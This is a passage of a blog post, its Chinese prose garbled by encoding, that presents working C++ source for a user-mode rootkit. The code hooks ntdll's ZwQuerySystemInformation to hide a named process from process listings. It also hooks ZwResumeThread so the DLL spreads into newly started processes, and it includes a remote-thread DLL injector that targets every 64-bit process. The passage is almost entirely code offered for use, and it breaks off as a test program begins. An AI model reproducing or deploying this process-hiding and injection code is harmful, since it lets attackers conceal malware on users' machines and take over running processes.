class="line"><span class="built_in">memcpy</span>(&amp;jmpcode[<span class="number">6</span>], &amp;targetAddr, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, jmpcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">unhookByCode</span><span class="params">(std::string moduleName, std::string processName, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, orgBytes, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;NtQuerySystemInformation&quot;</span>, &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (SystemInformationClass == <span class="number">5</span> &amp;&amp; g_szProcName[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pInfo = <span class="built_in">static_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(SystemInformation);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">while</span> (pNextInfo-&gt;NextEntryOffset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pNextInfo-&gt;ImageName.Buffer, g_szProcName))</span><br><span class="line">&#123;</span><br><span class="line">pInfo-&gt;NextEntryOffset += pNextInfo-&gt;NextEntryOffset;</span><br><span class="line">&#125;</span><br><span class="line">pInfo = pNextInfo;</span><br><span class="line">pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// å–å¾—å¯¹åº” PID å¥æŸ„</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;Memory allocation failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;WriteProcessMemory failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetModuleHandle failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetProcAddress failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;CreateRemoteThread failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;DLL injected successfully into process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* ZwQueryInformationThread_t)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ThreadInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG ThreadInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">THREAD_BASIC_INFORMATION tbi;</span><br><span class="line">FARPROC pqit = <span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">NTSTATUS statusThread = <span class="built_in">reinterpret_cast</span>&lt;ZwQueryInformationThread_t&gt;(pqit)(threadHandle, <span class="number">0</span>, &amp;tbi, <span class="built_in">sizeof</span>(tbi), <span class="literal">NULL</span>);</span><br><span class="line">DWORD dwPid = <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(tbi.ClientId.UniqueProcess);</span><br><span class="line">DWORD dwPrevPid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dwPid != <span class="built_in">GetCurrentProcessId</span>() &amp;&amp; dwPid != dwPrevPid)</span><br><span class="line">&#123;</span><br><span class="line">dwPrevPid = dwPid;</span><br><span class="line"><span class="built_in">inject</span>(dwPid, <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line">PZwResumeThread pZwResumeThread = <span class="built_in">reinterpret_cast</span>&lt;PZwResumeThread&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwResumeThread</span>(threadHandle, SuspendCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setProcName</span>(<span class="string">L&quot;Notepad.exe&quot;</span>);</span><br><span class="line"><span class="function">std::string <span class="title">curProc</span><span class="params">(MAX_PATH, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">GetModuleFileNameA</span>(<span class="literal">nullptr</span>, &amp;curProc[<span class="number">0</span>], curProc.<span class="built_in">size</span>());</span><br><span class="line">p = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(<span class="built_in">strrchr</span>(curProc.<span class="built_in">c_str</span>(), <span class="string">&#x27;\\&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">nullptr</span> &amp;&amp; !_stricmp(p + <span class="number">1</span>, <span class="string">&quot;DLL_inject.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">/*CreateThread(nullptr, 0, startHide, nullptr, 0, nullptr);*/</span></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å…¥å™¨æœ¬æ¥åº”è¯¥å®ç°å…¨å±€æ³¨å…¥ï¼Œä½†æ˜¯ç”±äºæˆ‘è¿™è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€æ³¨å°±æŒ‚ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å…¨å±€ï¼Œåªå•ç‹¬é€‰æ‹©äº†exploerï¼Œè¿™é‡Œçš„ä»£ç å’Œä¹‹å‰çš„æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœæƒ³ç»§ç»­æµ‹è¯•å…¨å±€æ³¨å…¥ï¼Œå¯ä»¥è¯•è¯•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Is64BitProcess</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL isWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsWow64Process</span>(hProcess, &amp;isWow64)) &#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !isWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// å–å¾—å¯¹åº” PID å¥æŸ„</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Memory allocation failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;WriteProcessMemory failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetModuleHandle failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;GetProcAddress failed\n&quot;</span>));</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateRemoteThread failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;DLL injected successfully into process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectAllProcesses</span><span class="params">(LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;CreateToolhelp32Snapshot failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (pe.th32ProcessID &lt;= <span class="number">100</span>) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">Is64BitProcess</span>(pe.th32ProcessID)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping 32-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pe.szExeFile, <span class="string">L&quot;StartMenuExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;ShellExperienceHost.exe&quot;</span>) ||</span><br><span class="line">!_tcsicmp(pe.szExeFile, <span class="string">L&quot;LockApp.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Skipping process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Attempting to inject into 64-bit process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>(pe.th32ProcessID, szDllPath)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Successfully injected into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Failed to inject into process: %s (PID: %d)\n&quot;</span>), pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Process32First failed\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class="line"><span class="comment">//if (argc != 2) &#123;</span></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;USAGE: %s dll_path\n&quot;), argv[0]);</span></span><br><span class="line"><span class="comment">//return 1;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line">TCHAR dllpath[] = <span class="string">L&quot;xxx\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">injectAllProcesses</span>(dllpath);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ˜¯64ä½ï¼Œä¸èƒ½ç”¨taskmgræµ‹è¯•QAQï¼Œæ‰€ä»¥å†™äº†ä¸€ä¸ªæµ‹è¯•ç¨‹åº</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 